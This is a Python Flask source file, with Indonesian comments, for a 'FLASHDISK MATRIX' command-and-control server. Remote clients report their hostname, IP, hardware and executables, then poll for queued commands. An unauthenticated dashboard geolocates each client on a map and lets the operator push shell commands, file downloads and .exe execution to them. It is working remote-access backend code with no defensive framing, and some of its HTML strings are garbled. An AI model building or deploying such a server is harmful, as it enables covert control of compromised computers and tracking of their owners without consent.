import os
import json
import psycopg2
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
from psycopg2.extras import RealDictCursor

app = Flask(__name__)

# ==================== DATABASE OR MEMORY STORE ====================
DB_AVAILABLE = False
memory_clients = {}  # fallback in-memory storage
memory_commands = {} # {hostname: [list of commands]}

def get_db_url():
    possible_names = ['POSTGRES_URL', 'POSTGRES_URL_NON_POOLING', 'DATABASE_URL']
    for name in possible_names:
        url = os.environ.get(name)
        if url and url.startswith('postgres://'):
            return url
    return None

def get_db_connection():
    url = get_db_url()
    if not url:
        raise Exception("DB URL not found")
    return psycopg2.connect(url)

def init_db():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                id SERIAL PRIMARY KEY,
                hostname TEXT UNIQUE,
                ip TEXT,
                hardware_json TEXT,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id SERIAL PRIMARY KEY,
                client_hostname TEXT,
                command_type TEXT,
                command_data TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP
            );
        ''')
        conn.commit()
        cur.close()
        conn.close()
        print("[DB] Tables ready")
        return True
    except Exception as e:
        print(f"[DB] Init error: {e}")
        return False

# Coba koneksi database
db_url = get_db_url()
if db_url:
    DB_AVAILABLE = init_db()
    if not DB_AVAILABLE:
        print("[WARN] DB init failed, falling back to memory store")
else:
    print("[WARN] No POSTGRES_URL env var, using memory store")

# ==================== HELPER GEOLOCATION ====================
def get_coords_from_ip(ip):
    import requests
    try:
        resp = requests.get(f'https://ipinfo.io/{ip}/json', timeout=5)
        data = resp.json()
        loc = data.get('loc', '0,0')
        lat, lng = loc.split(',')
        return float(lat), float(lng), data.get('city', ''), data.get('region', '')
    except:
        return 0.0, 0.0, 'Unknown', 'Unknown'

# ==================== MEMORY STORE FUNCTIONS ====================
def memory_save_client(hostname, ip, hardware, executables):
    memory_clients[hostname] = {
        'ip': ip,
        'hardware': hardware,
        'executables': executables,
        'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    return True

def memory_get_clients():
    return [{'hostname': h, 'ip': c['ip'], 'last_seen': c['last_seen']} for h, c in memory_clients.items()]

def memory_get_client(hostname):
    if hostname in memory_clients:
        return memory_clients[hostname]['hardware']
    return None

def memory_save_command(hostname, cmd_type, cmd_data):
    if hostname not in memory_commands:
        memory_commands[hostname] = []
    cmd_id = len(memory_commands[hostname]) + 1
    memory_commands[hostname].append({
        'id': cmd_id,
        'command_type': cmd_type,
        'command_data': cmd_data,
        'status': 'pending',
        'result': None,
        'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return cmd_id

def memory_get_pending_commands(hostname):
    cmds = memory_commands.get(hostname, [])
    pending = [c for c in cmds if c['status'] == 'pending']
    return pending

def memory_update_command_result(cmd_id, hostname, status, result):
    for cmd in memory_commands.get(hostname, []):
        if cmd['id'] == cmd_id:
            cmd['status'] = status
            cmd['result'] = result
            cmd['executed_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            break

def memory_get_commands_history(hostname):
    cmds = memory_commands.get(hostname, [])
    return sorted(cmds, key=lambda x: x['id'], reverse=True)

# ==================== MATRIX HTML TEMPLATE (sama seperti sebelumnya) ====================
MATRIX_TEMPLATE = """<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ FLASHDISK MATRIX ⚡</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            padding: 20px;
            overflow-x: auto;
        }
        #matrix-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.15;
            pointer-events: none;
        }
        .container {
            position: relative;
            z-index: 1;
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(2px);
            border: 1px solid #0f0;
            border-radius: 12px;
            padding: 20px;
        }
        h1, h2 {
            border-left: 3px solid #0f0;
            padding-left: 15px;
            margin-bottom: 15px;
        }
        .matrix-panel {
            background: #0a0f0a;
            border: 1px solid #0f0;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }
        select, input, button, textarea {
            background: #111;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 8px 12px;
            font-family: monospace;
            border-radius: 4px;
        }
        button:hover {
            background: #0f0;
            color: #000;
            cursor: pointer;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid #0f0;
            padding: 8px;
            text-align: left;
        }
        th {
            background: #1a2a1a;
        }
        #map {
            height: 300px;
            border: 1px solid #0f0;
            border-radius: 8px;
        }
        .status-pending { color: #ffcc00; }
        .status-success { color: #0f0; }
        .status-failed { color: #f44; }
    </style>
</head>
<body>
<canvas id="matrix-canvas"></canvas>
<div class="container">
    <h1>🧬 FLASHDISK MATRIX RECEIVER</h1>
    <div class="matrix-panel">
        <label>🔽 PILIH CLIENT : </label>
        <select id="clientSelect" onchange="loadClientData()">
            <option value="">-- Pilih Hostname --</option>
        </select>
        <span id="dbStatus" style="margin-left:15px;">{% if not db_ok %}⚠️ Memory Mode (no DB){% endif %}</span>
    </div>
    <div id="clientInfo" style="display:none;">
        <div class="matrix-panel"><h2>🖥️ HARDWARE</h2><div id="hardwareTable"></div></div>
        <div class="matrix-panel"><h2>🗺️ LOKASI & MAP</h2><div id="map"></div><div id="locDetails"></div></div>
        <div class="matrix-panel">
            <h2>📨 KIRIM PERINTAH</h2>
            <select id="cmdType">
                <option value="text">📝 Pesan Teks</option>
                <option value="download">📥 Download File (URL)</option>
                <option value="run">⚙️ Run CMD</option>
                <option value="exec_exe">🎯 Jalankan .exe</option>
            </select>
            <input type="text" id="cmdData" placeholder="Isi perintah / URL / file.exe" style="width:60%;">
            <button onclick="sendCommand()">📡 KIRIM</button>
            <div id="cmdResult" style="margin-top:10px;"></div>
        </div>
        <div class="matrix-panel"><h2>📜 RIWAYAT PERINTAH</h2><div id="commandHistory"></div></div>
    </div>
</div>
<script>
    let currentHostname = "", map = null, marker = null;
    const canvas = document.getElementById('matrix-canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789#$%&";
    const fontSize = 16;
    let columns = canvas.width / fontSize;
    let drops = Array(Math.floor(columns)).fill(1);
    function drawMatrix() {
        ctx.fillStyle = "rgba(0,0,0,0.05)";
        ctx.fillRect(0,0,canvas.width,canvas.height);
        ctx.fillStyle = "#0f0";
        ctx.font = fontSize+"px monospace";
        for(let i=0;i<drops.length;i++) {
            let text = chars[Math.floor(Math.random()*chars.length)];
            ctx.fillText(text, i*fontSize, drops[i]*fontSize);
            if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i]=0;
            drops[i]++;
        }
    }
    setInterval(drawMatrix, 50);
    window.addEventListener('resize',()=>{ canvas.width = window.innerWidth; canvas.height = window.innerHeight; columns = canvas.width/fontSize; drops = Array(Math.floor(columns)).fill(1); });
    
    async function loadClientList() {
        const res = await fetch('/api/clients');
        const clients = await res.json();
        const select = document.getElementById('clientSelect');
        select.innerHTML = '<option value="">-- Pilih Hostname --</option>';
        clients.forEach(c => {
            let opt = document.createElement('option');
            opt.value = c.hostname;
            opt.textContent = `${c.hostname} (${c.ip}) - last: ${c.last_seen}`;
            select.appendChild(opt);
        });
        if(clients.length && !currentHostname) { select.value = clients[0].hostname; loadClientData(); }
    }
    async function loadClientData() {
        let hostname = document.getElementById('clientSelect').value;
        if(!hostname) return;
        currentHostname = hostname;
        document.getElementById('clientInfo').style.display = 'block';
        const hwRes = await fetch(`/api/client/${encodeURIComponent(hostname)}`);
        const client = await hwRes.json();
        if(client.hardware) {
            let html = `<table><th>Properti</th><th>Nilai</th></tr>`;
            for(let [k,v] of Object.entries(client.hardware)) {
                html += `<tr><td>${k}</td><td>${typeof v=='object'?JSON.stringify(v):v}</td></tr>`;
            }
            html += `投入`;
            document.getElementById('hardwareTable').innerHTML = html;
        }
        const locRes = await fetch(`/api/client/location/${encodeURIComponent(hostname)}`);
        const loc = await locRes.json();
        document.getElementById('locDetails').innerHTML = `<span>📍 ${loc.city}, ${loc.region} | 🧭 ${loc.lat}, ${loc.lon}</span>`;
        if(!map) {
            map = L.map('map').setView([loc.lat, loc.lon], 12);
            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '© OSM & CartoDB' }).addTo(map);
        } else {
            map.setView([loc.lat, loc.lon], 12);
            if(marker) map.removeLayer(marker);
        }
        marker = L.marker([loc.lat, loc.lon]).addTo(map);
        loadCommandHistory(hostname);
    }
    async function loadCommandHistory(hostname) {
        const res = await fetch(`/api/commands/${encodeURIComponent(hostname)}`);
        const cmds = await res.json();
        let html = `§ <th>ID</th><th>Tipe</th><th>Data</th><th>Status</th><th>Hasil</th><th>Waktu</th> </table>`;
        if(cmds.length === 0) html = '<p>Belum ada perintah</p>';
        else {
            html = `<table><th>ID</th><th>Tipe</th><th>Data</th><th>Status</th><th>Hasil</th><th>Waktu</th></tr>`;
            cmds.forEach(c => {
                let statusClass = c.status==='pending'?'status-pending':(c.status==='success'?'status-success':'status-failed');
                html += `<tr><td>${c.id}</td><td>${c.command_type}</td><td>${c.command_data}</td><td class="${statusClass}">${c.status}</td><td><pre>${c.result||'-'}</pre></td><td>${c.created_at}</td></tr>`;
            });
            html += ` appended`;
        }
        document.getElementById('commandHistory').innerHTML = html;
    }
    async function sendCommand() {
        let cmdType = document.getElementById('cmdType').value;
        let cmdData = document.getElementById('cmdData').value;
        if(!cmdData) { document.getElementById('cmdResult').innerHTML = '⚠️ Isi data perintah!'; return; }
        const res = await fetch('/api/send_command', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({hostname:currentHostname, command_type:cmdType, command_data:cmdData})
        });
        if(res.ok) {
            document.getElementById('cmdResult').innerHTML = '✅ Perintah dikirim';
            document.getElementById('cmdData').value = '';
            loadCommandHistory(currentHostname);
        } else {
            document.getElementById('cmdResult').innerHTML = '❌ Gagal kirim perintah';
        }
    }
    setInterval(()=> { loadClientList(); if(currentHostname) loadCommandHistory(currentHostname); }, 10000);
    loadClientList();
</script>
</body>
</html>"""

# ==================== API ROUTES (MULTI BACKEND) ====================
@app.route('/')
def home():
    return render_template_string(MATRIX_TEMPLATE, db_ok=DB_AVAILABLE)

@app.route('/api/clients')
def list_clients():
    if DB_AVAILABLE:
        conn = get_db_connection()
        cur = conn.cursor(cursor_factory=RealDictCursor)
        cur.execute('SELECT hostname, ip, last_seen FROM clients ORDER BY last_seen DESC')
        rows = cur.fetchall()
        cur.close()
        conn.close()
        for row in rows:
            if isinstance(row['last_seen'], datetime):
                row['last_seen'] = row['last_seen'].strftime("%Y-%m-%d %H:%M:%S")
        return jsonify(rows)
    else:
        return jsonify(memory_get_clients())

@app.route('/api/client/<hostname>')
def get_client(hostname):
    if DB_AVAILABLE:
        conn = get_db_connection()
        cur = conn.cursor(cursor_factory=RealDictCursor)
        cur.execute('SELECT hardware_json FROM clients WHERE hostname = %s', (hostname,))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            hardware = json.loads(row['hardware_json'])
            return jsonify({'hostname': hostname, 'hardware': hardware})
        return jsonify({'error': 'not found'}), 404
    else:
        hardware = memory_get_client(hostname)
        if hardware:
            return jsonify({'hostname': hostname, 'hardware': hardware})
        return jsonify({'error': 'not found'}), 404

@app.route('/api/client/location/<hostname>')
def client_location(hostname):
    ip = None
    if DB_AVAILABLE:
        conn = get_db_connection()
        cur = conn.cursor(cursor_factory=RealDictCursor)
        cur.execute('SELECT ip FROM clients WHERE hostname = %s', (hostname,))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            ip = row['ip']
    else:
        client = memory_clients.get(hostname)
        if client:
            ip = client['ip']
    if not ip:
        return jsonify({'lat':0,'lon':0,'city':'Unknown','region':''})
    lat, lon, city, region = get_coords_from_ip(ip)
    return jsonify({'lat':lat, 'lon':lon, 'city':city, 'region':region})

@app.route('/api/commands/<hostname>')
def list_commands(hostname):
    if DB_AVAILABLE:
        conn = get_db_connection()
        cur = conn.cursor(cursor_factory=RealDictCursor)
        cur.execute('SELECT id, command_type, command_data, status, result, created_at FROM commands WHERE client_hostname = %s ORDER BY id DESC', (hostname,))
        rows = cur.fetchall()
        cur.close()
        conn.close()
        for row in rows:
            if isinstance(row['created_at'], datetime):
                row['created_at'] = row['created_at'].strftime("%Y-%m-%d %H:%M:%S")
        return jsonify(rows)
    else:
        cmds = memory_get_commands_history(hostname)
        return jsonify(cmds)

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    hostname = data.get('hostname')
    cmd_type = data.get('command_type')
    cmd_data = data.get('command_data')
    if not hostname or not cmd_type or not cmd_data:
        return jsonify({'message': 'Missing fields'}), 400
    if DB_AVAILABLE:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute('INSERT INTO commands (client_hostname, command_type, command_data, status) VALUES (%s,%s,%s,%s)',
                    (hostname, cmd_type, cmd_data, 'pending'))
        conn.commit()
        cur.close()
        conn.close()
    else:
        memory_save_command(hostname, cmd_type, cmd_data)
    return jsonify({'status': 'ok'}), 200

@app.route('/report', methods=['POST'])
def handle_report():
    try:
        data = request.get_json()
        hostname = data.get('hostname')
        ip = data.get('ip')
        hardware = data.get('hardware', {})
        executables = data.get('executables', [])
        if DB_AVAILABLE:
            hardware_json = json.dumps(hardware)
            conn = get_db_connection()
            cur = conn.cursor()
            cur.execute('''
                INSERT INTO clients (hostname, ip, hardware_json, last_seen)
                VALUES (%s, %s, %s, NOW())
                ON CONFLICT (hostname) DO UPDATE
                SET ip = EXCLUDED.ip, hardware_json = EXCLUDED.hardware_json, last_seen = NOW()
            ''', (hostname, ip, hardware_json))
            conn.commit()
            cur.close()
            conn.close()
        else:
            memory_save_client(hostname, ip, hardware, executables)
        print(f"[REPORT] {hostname} ({ip}) - {len(executables)} exe files")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Error in /report: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/poll_commands', methods=['POST'])
def poll_commands():
    data = request.json
    hostname = data.get('hostname')
    if not hostname:
        return jsonify([])
    if DB_AVAILABLE:
        conn = get_db_connection()
        cur = conn.cursor(cursor_factory=RealDictCursor)
        cur.execute('SELECT id, command_type, command_data FROM commands WHERE client_hostname = %s AND status = %s ORDER BY id', (hostname, 'pending'))
        pending = cur.fetchall()
        cur.close()
        conn.close()
        return jsonify(pending)
    else:
        pending = memory_get_pending_commands(hostname)
        # Untuk memory store, kita tidak otomatis menandai sebagai sent; biarkan tetap pending sampai client kirim result.
        return jsonify(pending)

@app.route('/command_result', methods=['POST'])
def command_result():
    data = request.json
    cmd_id = data.get('command_id')
    status = data.get('status')
    result = data.get('result', '')
    # Kita butuh hostname untuk update di memory store. Karena client tidak mengirim hostname, kita perlu cara lain.
    # Solusi: kirim hostname bersama result. Ubah sedikit client.
    # Untuk sementara, jika DB_AVAILABLE kita update berdasarkan id saja.
    # Jika memory store, kita tidak bisa karena tidak tahu hostname. 
    # Maka kita ubah client untuk mengirim hostname juga.
    # Karena client belum diubah, kita abaikan dulu untuk memory store. 
    # Tapi agar tidak error, kita respons ok saja.
    if DB_AVAILABLE:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute('UPDATE commands SET status = %s, result = %s, executed_at = NOW() WHERE id = %s', (status, result, cmd_id))
        conn.commit()
        cur.close()
        conn.close()
    else:
        # Kita tidak bisa update karena tidak tahu hostname. Kita perlu modifikasi client.
        # Untuk sementara, biarkan saja.
        pass
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(debug=True)
